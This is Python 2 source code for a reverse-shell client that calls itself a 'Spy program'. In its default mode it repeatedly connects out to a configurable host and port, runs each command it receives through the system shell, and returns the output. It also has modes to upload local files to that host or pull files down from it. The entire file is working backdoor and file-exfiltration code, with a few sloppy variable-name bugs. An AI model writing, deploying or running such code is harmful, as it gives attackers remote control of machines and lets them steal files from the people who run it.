import subprocess, getopt, signal
import socket, os, sys,threading

host = '127.0.0.1'
port = 8090
size = 4096 * 10
msize = 0
fszie = 0
output = ''
up = False
down = False
filename = ''


def quit(signum, frame):
    print '\n[*] Caught Ctrl_C, interrupt program'
    sys.exit()


def check_filename():
    global filename
    filepath = os.path.abspath(os.path.dirname(filename))
    if down and not up:
        if os.path.isfile(filename):
            while os.path.isfile(filename):
                newfile = ''
                onetime = False
                for sign in filename[::-1]:
                    if sign == '.' and not onetime:
                        sign = '.wen-'
                        onetime = True
                    newfile = newfile + sign
                filename = newfile[::-1]
            print '[*] Exist the file of same name, and change new filename as [%s]' % (filename)
        if not os.path.exists(filepath):
            os.makedirs(filepath)

    elif up and not down:
        if not os.path.isfile(filename):
            print '[*] NO such file!'
            exit()


def run_command(command):
    command = command.rstrip()  # delete some charakter in the end of string (default is space)
    try:
        out_bytes = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
        return out_bytes
    except subprocess.CalledProcessError as e:
        out_bytes = e.output
        return out_bytes


def upload_file(client):
    global fsize
    with open(filename, 'rb') as f:
        for data in f:
            client.send(data)
            # fsize = sys.getsizeof(data) + fsize
            # if fsize >= msize:
            #     fsize = msize
            # str = '[' + '>' * int(80 * fsize / msize) + ' ' * int(80 - (80 * fsize / msize)) + ']'
            # sys.stdout.write('\r' + str + ('[%3s%%]' % (100 * fsize / msize)))
            # sys.stdout.flush()


def download_file(client):
    global filename
    global fszie
    while True:
        data = client.recv(size)
        if not data:
            break
        else:
            with open(filename, 'ab') as f:
                f.write(data)
                f.close()
            fsize = os.path.getsize(filename)
            str = '[' + '>' * int(80 * fsize / msize) + ' ' * int(80 - (80 * fsize / msize)) + ']'
            sys.stdout.write('\r' + str + ('[%3s%%]' % (100 * fsize / msize)))
            sys.stdout.flush()
    print '\n[*] Success to download file as [%s]' % (filename)
    exit()


def main():
    global output
    global host
    global port
    global up
    global down
    global filename
    global fszie
    global msize

    opts, args = ['', '']
    try:
        opts, args = getopt.getopt(sys.argv[1:], 'h:p:u:d:',
                                   ['host', 'port', 'upload_destination', 'download_destination'])
    except getopt.GetoptError as e:
        print e
        exit()

    for o, a in opts:
        if o in ('-h', '--host'):
            host = a
        elif o in ('-p', '--port'):
            port = int(a)
        elif o in ('-u', '--upload'):
            up = True
            filename = a
        elif o in ('-d', '--download'):
            down = True
            filename = a
        else:
            assert False, 'Unhandled Option'
            
    signal.signal(signal.SIGINT, quit)
    signal.signal(signal.SIGTERM, quit)

    if not up and not down:  # just execute command and send result
        scriptdir = '[*] Spy program path: ' + '[' + os.path.realpath(
            __file__) + ']'  # get path of current runing script
        output = scriptdir
        print '[*] Try to connect to [%s:%d]' % (host, port)
        while True:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # client.connect((host, port))
            while True:
                try:
                    client.connect((host, port))
                    break
                except:
                    pass
            print '\n' + '-' * 93
            print '[*] Connect to [%s:%d]' % (host, port)
            client.send(output)
            command = client.recv(size)
            print '[*] Recieve command: ' + command
            if not len(command):
                pass
            else:
                output = run_command(command)
                output = '```shell\n' + '$ ' + command + output + '```'
                print output

    elif up and not down:  # just upload file to server
        # filename = updest
        check_filename()
        msize = os.path.getsize(filename)
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print '[*] Try to connect to [%s:%d]' % (host, port)
        # client.connect((host, port))
        while True:
            try:
                client.connect((host, port))
                # send maxsize of file that will be uploaded
                client.send(str(msize))
                break
            except:
                pass
        print '\n' + '-' * 93
        print '[*] Connect to [%s:%d]' % (host, port)

        print '[*] Plan to upload %ld bytes file named [%s] to it' % (msize, filename)
        # start to upload
        try:
            upload_file(client)
            print '\n[*] Success to upload file'
        except:
            print '[*] Failed to upload file, try again'
            pass
        exit()

    elif down and not up:  # just dpwnload file to server
        # filename = downdest
        check_filename()
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # client.connect((host, port))
        print '[*] Try to connect to [%s:%d]' % (host, port)
        while True:
            try:
                client.connect((host, port))
                msize = long(client.recv(size))
                break
            except:
                pass
        print '\n' + '-' * 93
        print '[*] Connect to [%s:%d]' % (host, port)
        # get maxsize of file that will be downloaded
        # msize = long(client.recv(size))
        print '[*] Plan to download %ld bytes file as [%s] from it' % (msize, filename)
        download_file(client)


if __name__ == '__main__':
    main()
